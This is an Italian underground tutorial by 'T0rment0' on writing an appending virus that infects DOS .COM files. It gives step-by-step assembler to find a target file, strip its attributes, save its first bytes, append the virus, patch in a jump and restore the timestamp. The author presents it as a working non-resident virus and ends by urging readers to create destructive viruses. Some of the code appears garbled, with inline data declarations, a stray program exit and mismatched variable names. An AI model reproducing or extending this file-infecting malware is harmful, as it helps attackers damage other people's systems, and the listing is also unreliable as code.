   _____ ________ __                                                               _____/ |___| |_| |                                                              __/ Infettare file COM |                                                        (________________________________|                                                                                                                                      di T0rment0                                                                                                                                                                                                                          Provero' a spiegarvi la semplice strada per infettare un file com alla          fine del programma. Questa routine funziona solo se segui tutti i passi         correttamente.                                                                  Allora questa e' una semplice descrizione di cosa fara' il codice               Assembler :                                                                                                                                                        1. Trova un file .COM nella directory corrente                                  2. Salva la data e gli attributi del file.                                      3. Salva i primi 3 Bytes in uno Stack                                           4. Infetta il File e ripristina 3 bytes nuovi                                   5. Mette la vecchia data e i vecchi attributi al file                                                                                                           Iniziamo                                                                        --------                                                                        ;---------------------------------------------------------------------          -                                                                               ; Semplice routine per cercare un file .COM                                     ;---------------------------------------------------------------------          -                                                                               com_files db "*.com",0                                                          mov ah,4eh ;segna i file *.COM                                                  mov dx,com_files                                                                mov cx,3 ;Attributi di Sola lettura o Nascosti                                  int 21h ;e' OK                                                                  cmp ax,12h ;E' presente qualche file?                                           je exit ;Se il file non e' presende Esce...                                     jmp found_file                                                                  ; Invece di uscire qui puoi fare in modo che il Virus cambi dir e               ; vede se sono presenti altri dile .com con l'aiuto della                       ; path o facendo una semplice ricerca per altre                                 found_file:                                                                         mov di,[si+file] ;di indica il nome del file                                    push si                                                                         add si,file ;si indica il nome del file...                                      mov ax,offset 4300h ;prende gli Attributi del file                              mov dx,si ;nome del file in dx..                                                int 21h                                                                         mov file_attrib,cx ;Salva gli Attributi.                                        file dw 0                                                                       ; Qui togliamo tutti gli attributi al file                                      mov ax,offset 4301h ;Setta gli attributi del file                               mov cx,offset 0fffeh ;Li Setta come file normali                                mov dx,si ;nome del file                                                        int 21h                                                                         mov ax,offset 3d02h ;Apre il file con Lettura/Scrittura.                        mov dx,si ;nome del file ASCIIZ                                                 int 21h                                                                         jnb ok ;Se il file era aperto continua                                          jmp put_old_attrib ; se appare un errore mettendo i vecchi                      ; attributi, esce.                                                              ok:                                                                             mov bx,ax                                                                       mov ax,offset 5700h ;Prende la data e l'ora dal file                            int 21h                                                                         mov old_time,cx ;Salva la vecchia ora del file                                  mov old_date,dx ;Salva la vecchia data del file                                 old_time db 0                                                                   old_date db 0                                                                   ; qui infettiamo il file... ma prima salviamo i primi 3 bytes                   ; in qualche parte del nostro virus                                             mov ah,3fh ;Legge il file                                                       mov cx,3 ;Numero dei byte da leggere                                            mov dx,first_3 ;Salva i bytes nel buffer                                        add dx,si ;Nome del file...                                                     int 21h                                                                         cmp ax,3 ;Dove sono stati letti i 3 bytes?                                      jnz fix_file ;Se il file non e' come prima, esce                                first_3 equ $ ; I primi tre bytes del file originale!                           int 20h ; il virus lo infetta.                                                  nop                                                                             ; Questo muove l'indicatore del file alla fine del file                         mov ax,offset 4202h                                                             mov cx,0                                                                        mov dx,0                                                                        int 21h                                                                         mov cx,ax ;DX:AX e' la grandezza del file                                       sub ax,3 ;sottrae 3                                                             add cx,offset c_len_y                                                           mov di,si                                                                       sub di,offset c_len_x                                                           mov [di],cx ;Modifica il 2ø e il 3ø bytes del programma                         ; Scrive il nostro virus nel file                                               mov ah,40h                                                                      mov cx,virlength ;Grandezza del virus                                           mov dx,si ;Nome del file...                                                     sub dx,offset codelength ;Lunghezza del codice del virus                        int 21h                                                                         cmp ax,offset virlength ;tutti i byte sono stati scritti?                       jnz fix_file ;Se la risposta e' no, esce                                        ;Sposta l'indicatore del file all'inizio del file e scrive                      ;3 bytes JMP all'inizio del file                                                mov ax,offset 4200h                                                             mov cx,0                                                                        mov dx,0                                                                        int 21h                                                                         mov ah,40h ;Scrive nel file                                                     mov cx,3 ;Numero dei bytes da scrivere                                          mov dx,si ;Nome del file...                                                     add dx,jump ;Inidica il nuovo stato degli JMP                                   int 21h                                                                         jump db 0e9h ;Questo e' il JMP che metteremo nell'inizio del file               ;Rimette la vecchia data e la vecchia ora                                       fix_file:                                                                       mov dx,old_date ;Vecchia data                                                   mov cx,old_time ;Vecchia ora                                                    and cx,offset 0ffe0h ;Attribbuti Flat                                           mov ax,offset 5701h                                                             int 21h                                                                         mov ah,3eh                                                                      int 21h ;Chiude il file                                                         ; Qui metteremo al file i suoi vecchi attributi                                 put_old_attrib:                                                                 mov ax,offset 4301h                                                             mov cx,old_att ;vecchi attributi del File                                       mov dx,si ;Nome del file....                                                    int 21h                                                                         ;----------------------------- EnD                                                                                                                                                                                                       Gia fatto! Semplice no? L'ho reso piu' semplice di come dovrebbe essere         infatti non ho messo la ricerca del path.                                       Comunque questo funziona bene come Virus Non-Resident . Perche' per farlo       diventare residente si dovra' modificare il TSR.                                Usare questo codice, pero', e' semplice e veloce                                Mi raccomando, non credete che sia il metodo piu' efficace, esso                e' stato creato solo con lo scopo di farvi imparare come funziona               la ricerca e l'infezione dei file COM.                                          Create virii distruttivi, per ora e' tutto. Byez                                                                                                                       --->T0rment0<----                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        